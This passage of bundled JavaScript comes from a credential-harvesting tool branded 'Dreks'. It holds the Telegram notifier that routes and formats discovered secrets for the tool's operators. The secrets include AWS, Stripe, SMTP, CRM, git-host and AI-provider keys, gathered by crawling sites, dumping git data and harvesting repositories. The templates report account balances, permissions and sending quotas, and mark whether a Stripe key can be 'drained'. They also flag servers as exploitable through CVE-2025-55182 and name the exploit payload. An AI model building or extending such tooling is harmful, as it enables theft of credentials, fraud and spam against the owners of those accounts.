};
function parseRetryAfter(body, fallback = 1) {
  const n = body?.parameters?.retry_after;
  return typeof n === "number" && n > 0 ? n : fallback;
}

// packages/notifier-telegram/src/channel.ts
var IA_SERVICES = /* @__PURE__ */ new Set([
  "openai",
  "anthropic",
  "groq",
  "huggingface",
  "openrouter",
  "perplexity",
  "xai",
  "mistral",
  "together",
  "fireworks",
  "deepseek",
  "cohere",
  "voyage",
  "replicate",
  "nvidia"
]);
function isIaService(service) {
  return !!service && IA_SERVICES.has(service);
}
function hitChannelId(hit, tg) {
  const service = hit.matches[0]?.service;
  if (hit.validationStatus === "invalid") return tg.invalidHitsChannelId;
  if (hit.validationStatus === "valid" && isIaService(service) && tg.iaValidHitsChannelId) {
    return tg.iaValidHitsChannelId;
  }
  return tg.validHitsChannelId;
}

// packages/notifier-telegram/src/templates.ts
init_src();
var BRAND = "<b>Dreks</b>";
var SEP = "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501";
function esc(s) {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
function code(s) {
  return `<code>${esc(s)}</code>`;
}
function b(s) {
  return `<b>${s}</b>`;
}
var SERVICE_UI = {
  github: { title: "\u{1F419} GITHUB \u{1F419}", keyLabel: "\u{1F511} Token:" },
  gitlab: { title: "\u{1F98A} GITLAB \u{1F98A}", keyLabel: "\u{1F511} Token:" },
  bitbucket: { title: "\u{1FAA3} BITBUCKET \u{1FAA3}", keyLabel: "\u{1F511} Token:" },
  gitbucket: { title: "\u{1FAA3} GITBUCKET \u{1FAA3}", keyLabel: "\u{1F511} Token:" },
  sendgrid: { title: "\u{1F48C} SENDGRID \u{1F48C}", keyLabel: "\u{1F511} API Key:" },
  stripe: { title: "\u{1F48E} STRIPE \u{1F48E}", keyLabel: "\u{1F511} Secret Key:" },
  aws: { title: "\u2601\uFE0F AWS \u2601\uFE0F", keyLabel: "\u{1F511} AKIA:" },
  brevo: { title: "\u{1F4E8} BREVO \u{1F4E8}", keyLabel: "\u{1F511} API Key:" },
  mailgun: { title: "\u{1F52B} MAILGUN \u{1F52B}", keyLabel: "\u{1F511} API Key:" },
  newmailgun: { title: "\u{1F52B} MAILGUN \u{1F52B}", keyLabel: "\u{1F511} API Key:" },
  smtp: { title: "\u2709\uFE0F SMTP \u2709\uFE0F", keyLabel: "\u{1F511} Password:" },
  xsmtp: { title: "\u2709\uFE0F SMTP \u2709\uFE0F", keyLabel: "\u{1F511} Password:" },
  emailsmtp: { title: "\u2709\uFE0F SMTP \u2709\uFE0F", keyLabel: "\u{1F511} Password:" },
  klaviyo: { title: "\u2709\uFE0F KLAVIYO CRM \u2709\uFE0F", keyLabel: "\u{1F511} API Key:" },
  zoho: { title: "\u{1F534} ZOHO CRM \u{1F534}", keyLabel: "\u{1F504} Refresh Token:" },
  openai: { title: "\u{1F916} OPENAI \u{1F916}", keyLabel: "\u{1F511} API Key:" },
  anthropic: { title: "\u{1F7E3} ANTHROPIC \u{1F7E3}", keyLabel: "\u{1F511} API Key:" },
  groq: { title: "\u26A1 GROQ \u26A1", keyLabel: "\u{1F511} API Key:" },
  huggingface: { title: "\u{1F917} HUGGINGFACE \u{1F917}", keyLabel: "\u{1F511} API Key:" },
  openrouter: { title: "\u{1F9ED} OPENROUTER \u{1F9ED}", keyLabel: "\u{1F511} API Key:" },
  perplexity: { title: "\u{1F52E} PERPLEXITY \u{1F52E}", keyLabel: "\u{1F511} API Key:" },
  xai: { title: "\u{1D54F} XAI \u{1D54F}", keyLabel: "\u{1F511} API Key:" },
  mistral: { title: "\u{1F32C}\uFE0F MISTRAL \u{1F32C}\uFE0F", keyLabel: "\u{1F511} API Key:" },
  together: { title: "\u{1F91D} TOGETHER \u{1F91D}", keyLabel: "\u{1F511} API Key:" },
  fireworks: { title: "\u{1F386} FIREWORKS \u{1F386}", keyLabel: "\u{1F511} API Key:" },
  deepseek: { title: "\u{1F40B} DEEPSEEK \u{1F40B}", keyLabel: "\u{1F511} API Key:" },
  cohere: { title: "\u{1F7E0} COHERE \u{1F7E0}", keyLabel: "\u{1F511} API Key:" },
  voyage: { title: "\u{1F9ED} VOYAGE \u{1F9ED}", keyLabel: "\u{1F511} API Key:" },
  replicate: { title: "\u{1F9EA} REPLICATE \u{1F9EA}", keyLabel: "\u{1F511} API Key:" },
  nvidia: { title: "\u{1F7E2} NVIDIA \u{1F7E2}", keyLabel: "\u{1F511} API Key:" },
  twilio: { title: "\u{1F4F1} TWILIO \u{1F4F1}", keyLabel: "\u{1F511} Auth Token:" },
  postmark: { title: "\u{1F4EE} POSTMARK \u{1F4EE}", keyLabel: "\u{1F511} API Key:" },
  sparkpost: { title: "\u26A1 SPARKPOST \u26A1", keyLabel: "\u{1F511} API Key:" },
  resend: { title: "\u{1F4E8} RESEND \u{1F4E8}", keyLabel: "\u{1F511} API Key:" },
  mandrill: { title: "\u{1F4EC} MANDRILL \u{1F4EC}", keyLabel: "\u{1F511} API Key:" },
  mailersend: { title: "\u{1F4E4} MAILERSEND \u{1F4E4}", keyLabel: "\u{1F511} API Key:" },
  hubspot: { title: "\u{1F7E7} HUBSPOT CRM \u{1F7E7}", keyLabel: "\u{1F511} API Key:" },
  pipedrive: { title: "\u{1F7E2} PIPEDRIVE CRM \u{1F7E2}", keyLabel: "\u{1F511} API Token:" },
  clickup: { title: "\u{1F4CB} CLICKUP \u{1F4CB}", keyLabel: "\u{1F511} Token:" },
  close: { title: "\u{1F3AF} CLOSE CRM \u{1F3AF}", keyLabel: "\u{1F511} API Key:" },
  salesforce: { title: "\u2601\uFE0F SALESFORCE CRM \u2601\uFE0F", keyLabel: "\u{1F511} Token:" },
  azure: { title: "\u{1F511} AZURE", keyLabel: "\u{1F511} Client Secret:" },
  monday: { title: "\u{1F4CA} MONDAY.COM CRM \u{1F4CA}", keyLabel: "\u{1F511} Token:" },
  highlevel: { title: "\u{1F680} GOHIGHLEVEL CRM \u{1F680}", keyLabel: "\u{1F511} API Key:" },
  mailtrap: { title: "\u{1F4E5} MAILTRAP \u{1F4E5}", keyLabel: "\u{1F511} API Key:" },
  elasticemail: { title: "\u26A1 ELASTICEMAIL \u26A1", keyLabel: "\u{1F511} API Key:" },
  socketlabs: { title: "\u{1F50C} SOCKETLABS \u{1F50C}", keyLabel: "\u{1F511} API Key:" },
  react2shell: { title: "\u{1F4A3} REACT2SHELL (CVE-2025-55182) \u{1F4A3}", keyLabel: "\u{1F517} URL:" }
};
function displayPath(hit) {
  if (hit.path) return hit.path;
  if (hit.source === "git" && hit.blobPath) {
    return hit.blobPath.startsWith("/") ? hit.blobPath : `/.git/${hit.blobPath}`;
  }
  if (hit.scriptUrl) return pathnameOf(hit.scriptUrl);
  if (hit.mapUrl) return pathnameOf(hit.mapUrl);
  return "/";
}
function methodLabel(hit) {
  switch (hit.source) {
    case "path":
      return "Path probe";
    case "js":
      return hit.scriptUrl ? `JS crawl (${pathnameOf(hit.scriptUrl)})` : "JS crawl";
    case "sourcemap":
      return hit.mapUrl ? `Source map (${pathnameOf(hit.mapUrl)})` : "Source map";
    case "git":
      if (hit.path?.startsWith("gh-harvest:")) return "GitHub harvest";
      if (hit.path?.startsWith("gl-harvest:")) return "GitLab harvest";
      if (hit.path?.startsWith("bb-harvest:")) return "Bitbucket harvest";
      return "Git dump";
    case "recon": {
      const kind = hit.payloadType ?? "";
      if (kind === "guidance-rescan") return "Recon (robots/sitemap)";
      if (kind === "robots.txt") return "Recon (robots.txt)";
      if (kind === "sitemap.xml") return "Recon (sitemap)";
      if (kind) return `Recon (${kind})`;
      return "Recon";
    }
    case "homepage":
      return "Homepage HTML";
    case "vuln":
      return "Vuln probe (React2Shell)";
    default:
      return hit.source;
  }
}
function pathnameOf(url) {
  try {
    return new URL(url).pathname;
  } catch {
    return url;
  }
}
function primaryValue(hit) {
  const svc = hit.matches[0]?.service;
  if (svc === "stripe") {
    return hit.matches.find((m) => m.value.startsWith("sk_"))?.value ?? hit.matches[0]?.value ?? "";
  }
  if (svc === "aws") {
    return hit.matches.find((m) => /^A[KS]IA[A-Z0-9]{16}$/.test(m.value))?.value ?? hit.matches[0]?.value ?? "";
  }
  return hit.matches[0]?.value ?? "";
}
function awsSecret(hit) {
  const akia = primaryValue(hit);
  return hit.matches.find((m) => m.value !== akia && isValidAwsSecretKey(m.value))?.value ?? "";
}
function stamp2(now = /* @__PURE__ */ new Date()) {
  return new Intl.DateTimeFormat("sv-SE", {
    timeZone: "Europe/Paris",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  }).format(now).replace("T", " ");
}
function serviceTitle(hit) {
  const svc = hit.matches[0]?.service ?? "unknown";
  const kind = hit.validationMeta?.statusKind;
  if (svc === "sendgrid" && hit.validationMeta?.envBlock) return "\u{1F48C} SENDGRID SMTP \u{1F48C}";
  if (svc === "stripe" && hit.validationMeta?.testKey === "1") return "\u{1F48E} STRIPE \u2697\uFE0F [TEST KEY] \u{1F48E}";
  if (svc === "smtp" && kind === "extracted") return "\u2709\uFE0F SMTP PARTIEL \u2709\uFE0F";
  if (svc === "aws" && kind === "ses") return "\u2601\uFE0F AWS SES \u2601\uFE0F";
  if (svc === "aws" && kind === "zero-perm") return "\u2601\uFE0F AWS (0 PERMISSION) \u2601\uFE0F";
  return SERVICE_UI[svc]?.title ?? `\u{1F511} ${svc.toUpperCase()}`;
}
function statusBanner(hit) {
  const kind = hit.validationMeta?.statusKind;
  if (kind === "unverified-network") return { light: "\u{1F7E1}", line: "\u26A0\uFE0F NON V\xC9RIFI\xC9 (r\xE9seau)" };
  if (kind === "extracted") {
    if (hit.matches[0]?.service === "smtp") return { light: "\u{1F7E1}", line: "\u26A0\uFE0F CONFIGURATION EXTRAITE (Sans Mot de Passe)" };
    return { light: "\u{1F7E2}", line: "\u2705 IDENTIFIANTS EXTRAITS \u2705" };
  }
  if (kind === "test-key") return { light: "\u{1F7E1}", line: "\u2697\uFE0F CL\xC9 DE TEST \u2014 DRAIN IMPOSSIBLE" };
  if (kind === "zero-perm") return { light: "\u{1F7E0}", line: "\u26A0\uFE0F CL\xC9 AUTHENTIQUE MAIS AUCUNE PERMISSION ACTIVE (0 PERM) \u26A0\uFE0F" };
  if (kind === "ses") {
    const q = hit.validationMeta?.sesQuota ?? "?";
    return { light: "\u{1F7E2}", line: `\u2705 V\xC9RIFI\xC9 VALIDE (SES ACTIF \u2014 ${esc(q)} EMAILS/JOUR) \u2705` };
  }
  if (hit.matches[0]?.service === "react2shell") {
    if (hit.validationStatus === "valid") {
      return { light: "\u{1F534}", line: "\u{1F6A8} VULN\xC9RABLE \u2014 RCE POSSIBLE (CVE-2025-55182) \u{1F6A8}" };
    }
    return { light: "\u{1F7E2}", line: "\u2705 PATCH\xC9 \u2014 NON VULN\xC9RABLE \u2705" };
  }
  if (hit.validationStatus === "valid") return { light: "\u{1F7E2}", line: "\u2705 V\xC9RIFI\xC9 VALIDE \u2705" };
  if (hit.validationStatus === "invalid") return { light: "\u{1F534}", line: "\u274C INVALIDE \u274C" };
  return { light: "\u{1F7E1}", line: "non valid\xE9" };
}
function isRawGeneric(hit) {
  const svc = hit.matches[0]?.service ?? "";
  if (SERVICE_UI[svc] && ["smtp", "xsmtp", "emailsmtp", "zoho", "klaviyo", "sendgrid", "stripe", "aws", "github", "gitlab", "bitbucket", "gitbucket", "mailgun", "newmailgun", "brevo", "mandrill", "postmark", "sparkpost", "resend", "mailersend", "twilio", "salesforce", "azure", "monday", "mailtrap", "elasticemail"].includes(svc)) {
    return false;
  }
  return hit.validationStatus === "raw" && hit.validationMeta?.statusKind !== "extracted";
}
function urlBlock(hit, compact) {
  const path = displayPath(hit);
  if (compact) {
    return [`\u{1F310} ${code(hit.url)}`, `\u{1F4C1} ${code(path)}`, `\u{1F50E} ${b("M\xE9thode:")} ${esc(methodLabel(hit))}`, ""];
  }
  return [
    `\u{1F517} ${b("URL:")} ${code(hit.url)}`,
    `\u{1F4C2} ${b("Path:")} ${code(path)}`,
    `\u{1F50E} ${b("M\xE9thode:")} ${esc(methodLabel(hit))}`,
    ""
  ];
}
function envBlockLines(block) {
  return block.split("\n").filter((l) => l.length > 0).map((l) => {
    const eq = l.indexOf("=");
    if (eq <= 0) return code(l);
    return `${esc(l.slice(0, eq))}=${code(l.slice(eq + 1))}`;
  }).join("\n");
}
function extraBlock(hit) {
  const m = hit.validationMeta ?? {};
  const svc = hit.matches[0]?.service;
  if (svc === "github") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F464} ${b("Identit\xE9:")} ${esc(m.identity ?? "N/A")}`,
      `\u{1F4C1} ${b("Repos publics:")} ${esc(m.publicRepos ?? "0")} | \u{1F512} Priv\xE9s: ${esc(m.privateRepos ?? "0")}`,
      `\u{1F465} ${b("Followers:")} ${esc(m.followers ?? "0")}`,
      `\u{1F6E1}\uFE0F ${b("Scopes:")} ${esc(m.scopes ?? "N/A")}`,
      ...m.recentRepos ? [`\u{1F4C2} ${b("Repos r\xE9cents:")} ${esc(m.recentRepos)}`] : [],
      ...m.crawled ? [`\u{1F50E} ${b("Crawl\xE9s:")} ${esc(m.crawled)} repo(s)`] : [],
      ""
    ];
  }
  if (svc === "gitlab" || svc === "bitbucket" || svc === "gitbucket") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F464} ${b("Identit\xE9:")} ${esc(m.identity ?? "N/A")}`,
      `\u{1F4C1} ${b("Repos publics:")} ${esc(m.publicRepos ?? "0")} | \u{1F512} Priv\xE9s: ${esc(m.privateRepos ?? "0")}`,
      ...m.followers ? [`\u{1F465} ${b("Followers:")} ${esc(m.followers)}`] : [],
      ...m.host ? [`\u{1F5A5}\uFE0F ${b("Host:")} ${esc(m.host)}`] : [],
      ...m.admin ? [`\u{1F6E1}\uFE0F ${b("Admin:")} ${esc(m.admin)}`] : [],
      ...m.recentRepos ? [`\u{1F4C2} ${b("Repos r\xE9cents:")} ${esc(m.recentRepos)}`] : [],
      ...m.crawled ? [`\u{1F50E} ${b("Crawl\xE9s:")} ${esc(m.crawled)} fichier(s)`] : [],
      ""
    ];
  }
  if (svc === "sendgrid") {
    const lines = [];
    if (m.envBlock) lines.push(envBlockLines(m.envBlock), "");
    if (m.accountType) {
      lines.push(
        `\u{1F4BC} ${b("Type compte:")} ${esc(m.accountType)}`,
        `\u{1F4CA} ${b("Quota:")} ${esc(m.quota ?? "N/A")}`,
        `\u{1F4EC} ${b(m.envBlock ? "Senders v\xE9rifi\xE9s:" : "From:")} ${esc(m.from && m.from !== "N/A" ? m.from : "Aucun")}`,
        ""
      );
      if (!m.envBlock) lines.push("\u2705 SMTP: Disponible", "");
    } else if (hit.validationStatus === "invalid") {
      lines.push(`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, "");
    }
    return lines;
  }
  if (svc === "stripe") {
    if (hit.validationStatus === "invalid" && m.statusKind !== "test-key") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    const lines = [];
    if (m.publicKey) {
      lines.push(`${b("\u{1F513} Public Key:")}`, code(m.publicKey), "");
    }
    lines.push(
      `\u{1F3E2} ${b("Soci\xE9t\xE9:")} ${esc(m.company ?? "N/A")}`,
      `\u{1F30D} ${b("Pays:")} ${esc(m.country ?? "N/A")}`,
      `\u{1F4B0} ${b("Solde:")} ${esc(m.balance ?? "N/A")}`
    );
    if (m.permBlock) {
      lines.push("", `\u{1F510} ${b("Permissions:")}`, esc(m.permBlock));
    }
    if (m.statusKind === "test-key") {
      lines.push("", "\u26A0\uFE0F <b>ATTENTION:</b> Cl\xE9 de test uniquement. Aucun drain r\xE9el possible.");
    }
    lines.push("");
    return lines;
  }
  if (svc === "aws") {
    const lines = [];
    if (m.account) lines.push(`\u{1F3DB}\uFE0F ${b("Account:")} ${esc(m.account)}`);
    if (m.arn) lines.push(`\u{1F464} ${b("ARN:")} ${esc(m.arn)}`);
    if (m.region) lines.push(`\u{1F30D} ${b("Region:")} ${esc(m.region)}`);
    if (m.sesBlock) {
      lines.push("", `\u{1F4CA} ${b("SES QUOTAS:")}`);
      for (const line of m.sesBlock.split("\n")) {
        if (line === "SES QUOTAS:" || !line) continue;
        lines.push(esc(line));
      }
    }
    if (m.permBlock) {
      lines.push("", `\u{1F510} ${b("R\xC9SULTATS DES PERMISSIONS:")}`, esc(m.permBlock));
    }
    if (hit.validationStatus === "invalid" && m.statusKind !== "zero-perm") {
      lines.push(`\u274C ${b("Erreur:")} ${esc(hit.validationDetails || hit.validationError || "invalide")}`);
    }
    lines.push("");
    return lines;
  }
  if (svc === "mailgun" || svc === "newmailgun") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    const n = m.domainCount ?? "0";
    return [
      `\u{1F30D} ${b("R\xE9gion:")} ${esc(m.region ?? "N/A")}`,
      `\u{1F310} ${b(`Domaines (${esc(n)}):`)} ${esc(m.domains ?? "Aucun")}`,
      `\u{1F4EC} ${b("From / SMTP login:")} ${esc(m.from ?? "Aucun")}`,
      `\u{1F4CA} ${b("Accepted (1m):")} ${esc(m.quota ?? "N/A")}`,
      ""
    ];
  }
  if (svc === "brevo") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F3E2} ${b("Soci\xE9t\xE9:")} ${esc(m.company ?? "N/A")}`,
      `\u{1F4E7} ${b("Email:")} ${esc(m.email ?? "N/A")}`,
      `\u{1F4CA} ${b("Cr\xE9dits:")} ${esc(m.credits ?? "N/A")}`,
      `\u{1F4C8} ${b("Envoy\xE9s aujourd'hui:")} ${esc(m.sentToday ?? "0")}`,
      `\u{1F4EC} ${b("From / Senders:")} ${esc(m.from ?? "Aucun")}`,
      ""
    ];
  }
  if (svc === "mandrill") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F464} ${b("Username:")} ${esc(m.username ?? "N/A")}`,
      `\u{1F4CA} ${b("Hourly Quota:")} ${esc(m.quota ?? "N/A")}`,
      `\u2B50 ${b("Reputation:")} ${esc(m.reputation ?? "0")}`,
      `\u{1F4C8} ${b("Sent Today:")} ${esc(m.sentToday ?? "0")} | ${b("All Time:")} ${esc(m.sentAll ?? "0")}`,
      ""
    ];
  }
  if (svc === "postmark") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F5A5}\uFE0F ${b("Serveur:")} ${esc(m.server ?? "N/A")}`,
      `\u{1F4EC} ${b("Inbound / From:")} ${esc(m.from ?? "N/A")}`,
      `\u2705 ${b("SMTP:")} ${esc(m.smtp ?? "N/A")}`,
      ""
    ];
  }
  if (svc === "sparkpost") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F3E2} ${b("Soci\xE9t\xE9:")} ${esc(m.company ?? "N/A")}`,
      `\u{1F4EC} ${b("Sending domains:")} ${esc(m.from ?? "Aucun")}`,
      `\u{1F4CA} ${b("Plan:")} ${esc(m.plan ?? "N/A")}`,
      ""
    ];
  }
  if (svc === "resend" || svc === "mailersend") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F310} ${b("Domaines:")} ${esc(m.domains ?? "Aucun")}`,
      `\u{1F4EC} ${b("From:")} ${esc(m.from ?? "Aucun")}`,
      ...m.region ? [`\u{1F30D} ${b("R\xE9gion:")} ${esc(m.region)}`] : [],
      ""
    ];
  }
  if (svc === "smtp" || svc === "xsmtp" || svc === "emailsmtp") {
    const lines = [];
    if (m.envBlock) lines.push(envBlockLines(m.envBlock), "");
    lines.push(`\u{1F3F7}\uFE0F ${b("Service:")} ${esc(m.smtpBrand ?? "\u{1F4E7} SMTP G\xE9n\xE9rique")}`, "");
    if (m.portWarn) lines.push(esc(m.portWarn));
    if (m.dialError) lines.push(`\u{1F4F5} <i>${esc(m.dialError)}</i>`);
    return lines;
  }
  if (svc === "salesforce") {
    const lines = [];
    if (m.envBlock) lines.push(envBlockLines(m.envBlock), "");
    else if (hit.matches[0]?.value) lines.push(`${b("\u{1F511} Session:")} ${code(hit.matches[0].value)}`, "");
    if (hit.validationStatus === "valid") {
      lines.push(
        `\u{1F3E2} ${b("Org:")} ${esc(m.org ?? "N/A")}`,
        `\u{1F464} ${b("User:")} ${esc(m.user ?? "N/A")}`,
        `\u2709\uFE0F ${b("Email:")} ${esc(m.email ?? "N/A")}`,
        `\u{1F30D} ${b("Instance:")} ${esc(m.instance ?? "N/A")}`
      );
      if (m.edition) lines.push(`\u{1F3F7}\uFE0F ${b("Edition:")} ${esc(m.edition)}`);
      if (m.sandbox) lines.push(`\u{1F9EA} ${b("Sandbox:")} ${esc(m.sandbox)}`);
      lines.push("");
    } else if (hit.validationStatus === "invalid") {
      lines.push(`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, "");
    }
    return lines;
  }
  if (svc === "azure") {
    const lines = [];
    if (m.envBlock) lines.push(envBlockLines(m.envBlock), "");
    if (hit.validationStatus === "valid") {
      lines.push(
        `\u{1F3E2} ${b("Tenant:")} ${esc(m.org ?? "N/A")}`,
        `\u{1F194} ${b("Tenant ID:")} ${code(m.tenantId ?? "N/A")}`,
        `\u{1F194} ${b("Client ID:")} ${code(m.clientId ?? "N/A")}`,
        `\u{1F310} ${b("Domaines:")} ${esc(m.domains ?? "N/A")}`,
        `\u{1F4E1} ${b("Graph:")} ${esc(m.graph ?? "OK")}`,
        ""
      );
    } else if (hit.validationStatus === "invalid") {
      lines.push(`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, "");
    }
    return lines;
  }
  if (svc === "zoho") {
    const lines = [];
    if (m.envBlock) lines.push(envBlockLines(m.envBlock), "");
    if (hit.validationStatus === "valid") {
      lines.push(
        `\u{1F3E2} ${b("Org:")} ${esc(m.org ?? "N/A")}`,
        `\u{1F464} ${b("User:")} ${esc(m.user ?? "N/A")}`,
        `\u2709\uFE0F ${b("Email:")} ${esc(m.email ?? "N/A")}`,
        `\u{1F30D} ${b("DC:")} ${esc(m.dc ?? "com")}`,
        `\u{1F4E6} ${b("Licence:")} ${esc(m.license ?? "N/A")}`
      );
      if (m.role) lines.push(`\u{1F3F7}\uFE0F ${b("R\xF4le:")} ${esc(m.role)}`);
      lines.push("");
    } else if (hit.validationStatus === "invalid") {
      lines.push(`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, "");
    }
    return lines;
  }
  if (svc === "monday") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F3E2} ${b("Account:")} ${esc(m.org ?? "N/A")}`,
      `\u{1F464} ${b("User:")} ${esc(m.user ?? "N/A")}`,
      `\u2709\uFE0F ${b("Email:")} ${esc(m.email ?? "N/A")}`,
      ...m.slug ? [`\u{1F517} ${b("Slug:")} ${esc(m.slug)}`] : [],
      ""
    ];
  }
  if (svc === "mailtrap") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [`\u{1F3E2} ${b("Accounts:")} ${esc(m.accounts ?? m.org ?? "N/A")}`, ""];
  }
  if (svc === "elasticemail") {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    return [
      `\u{1F3E2} ${b("Soci\xE9t\xE9:")} ${esc(m.org ?? "N/A")}`,
      `\u2709\uFE0F ${b("Email:")} ${esc(m.email ?? "N/A")}`,
      `\u2B50 ${b("R\xE9putation:")} ${esc(m.reputation ?? "N/A")}`,
      `\u{1F4CA} ${b("Quota jour:")} ${esc(m.dailyLimit ?? "N/A")}`,
      ""
    ];
  }
  if (svc === "klaviyo") {
    const lists = m.listsBlock ? `
${esc(m.listsBlock)}` : "\n  \u2022 N/A";
    return [
      `\u{1F3E2} ${b("Organisation :")} ${code(m.org ?? "N/A")}`,
      `\u{1F310} ${b("Timezone / Devise :")} ${esc(m.timezone ?? "N/A")} (${esc(m.currency ?? "N/A")})`,
      `\u2709\uFE0F ${b("From Email(s) :")} ${esc(m.fromEmails ?? "Non d\xE9tect\xE9")}`,
      `\u2699\uFE0F ${b("Flows Automatis\xE9s :")} ${esc(m.flowCount ?? "0")} flux`,
      "",
      `\u{1F465} ${b(`Listes d'abonn\xE9s (${esc(m.listCount ?? "0")}) :`)}${lists}`,
      "",
      `\u{1F4C8} ${b("Capacit\xE9 d'envois :")} ~10\xD7 le total de profils du forfait / mois`,
      ""
    ];
  }
  if (svc === "twilio") {
    if (hit.validationStatus === "invalid" && m.statusKind !== "unverified-network") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    if (m.statusKind === "extracted" || !m.friendlyName) {
      return [`\u2139\uFE0F ${esc(hit.validationDetails || "Account SID manquant \u2014 num\xE9ros indisponibles")}`, ""];
    }
    return [
      `\u{1F464} ${b("Nom:")} ${esc(m.friendlyName)}`,
      `\u{1F4CA} ${b("Status:")} ${esc(m.accountStatus ?? "N/A")} | ${b("Type:")} ${esc(m.accountType ?? "N/A")}`,
      `\u{1F4B0} ${b("Solde:")} ${esc(m.balance ?? "N/A")}`,
      `\u{1F4F1} ${b("Num\xE9ros:")} ${esc(m.numbers ?? "Aucun")}`,
      ""
    ];
  }
  if (svc === "react2shell") {
    const lines = [
      `\u{1F3AF} ${b("CVE:")} CVE-2025-55182 \u2014 React Server Components RCE (Server Actions)`,
      `\u{1F9E9} ${b("Runtime:")} react-server-dom-${esc(m.flavor ?? "N/A")}`,
      `\u{1F522} ${b("Version:")} ${esc(m.version ?? "N/A")}`
    ];
    if (m.evidence) lines.push(`\u{1F9FE} ${b("Preuve:")} ${esc(m.evidence)}`);
    if (m.marker) lines.push(`\u{1F575}\uFE0F ${b("D\xE9tection Next.js:")} ${esc(m.marker)}`);
    lines.push("", "\u26A0\uFE0F <b>Exploit:</b> multipart forg\xE9 `$ACTION_REF_0` \u2192 ex\xE9cution de code sur le serveur.");
    lines.push("");
    return lines;
  }
  if (isIaService(svc)) {
    if (hit.validationStatus !== "valid") {
      return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
    }
    const lines = [];
    if (m.identity) lines.push(`\u{1F464} ${b("Compte:")} ${esc(m.identity)}`);
    if (m.accountType) lines.push(`\u{1F3F7}\uFE0F ${b("Type:")} ${esc(m.accountType)}`);
    if (m.email) lines.push(`\u2709\uFE0F ${b("Email:")} ${esc(m.email)}`);
    if (m.org) lines.push(`\u{1F3E2} ${b("Org:")} ${esc(m.org)}`);
    if (m.plan) lines.push(`\u{1F4E6} ${b("Plan:")} ${esc(m.plan)}`);
    if (m.quota) lines.push(`\u{1F4CA} ${b("Quota:")} ${esc(m.quota)}`);
    if (m.balance) lines.push(`\u{1F4B0} ${b("Solde:")} ${esc(m.balance)}`);
    if (m.usage) lines.push(`\u{1F4C8} ${b("Usage:")} ${esc(m.usage)}`);
    if (m.modelCount != null || m.models) {
      const names = (m.models ?? "").split("\n").filter(Boolean);
      const count = Number(m.modelCount || names.length);
      const extra = Number.isFinite(count) ? Math.max(0, count - names.length) : 0;
      const modelLines = names.map((id) => `  \u2022 ${code(id)}`);
      if (extra > 0) modelLines.push(`  \u2026 et ${extra} autre(s)`);
      if (!modelLines.length) modelLines.push("  \u2022 (aucun id dans la r\xE9ponse)");
      const shown = Number.isFinite(count) ? count : names.length;
      if (lines.length) lines.push("");
      lines.push(`\u{1F9E0} ${b(`Mod\xE8les disponibles (${esc(String(shown))}) :`)}`, ...modelLines);
    } else if (!lines.length && hit.validationDetails) {
      lines.push(`\u2139\uFE0F ${esc(hit.validationDetails)}`);
    }
    lines.push("");
    return lines;
  }
  if (m.statusKind === "extracted") return [""];
  if (hit.validationStatus === "invalid") {
    return [`\u274C ${esc(hit.validationDetails || hit.validationError || "invalide")}`, ""];
  }
  if (hit.validationDetails && hit.validationStatus !== "valid") {
    return [`\u2139\uFE0F ${esc(hit.validationDetails)}`, ""];
  }
  return [""];
}
function credentialBlock(hit) {
  const svc = hit.matches[0]?.service ?? "";
  if (svc === "smtp" || svc === "xsmtp" || svc === "emailsmtp") return [];
  if (svc === "salesforce" && hit.validationMeta?.envBlock) return [];
  if (svc === "azure" && hit.validationMeta?.envBlock) return [];
  if (svc === "zoho" && hit.validationMeta?.envBlock) return [];
  if (svc === "sendgrid" && hit.validationMeta?.envBlock) return [];
  const ui = SERVICE_UI[svc] ?? { title: "", keyLabel: "\u{1F511} Token:" };
  if (svc === "aws") {
    const secret = awsSecret(hit);
    const lines = [`\u{1F511} ${b("AKIA:")} ${code(primaryValue(hit))}`];
    if (secret) lines.push(`\u{1F510} ${b("Secret:")} ${code(secret)}`);
    lines.push("");
    return lines;
  }
  if (svc === "zoho") {
    const token = hit.validationMeta?.token ?? primaryValue(hit);
    return [`\u{1F504} ${b("Refresh Token:")} ${code(token)}`, ""];
  }
  if (svc === "klaviyo") {
    return [`\u{1F511} ${b("API Key:")} ${code(primaryValue(hit))}`, ""];
  }
  if (svc === "twilio") {
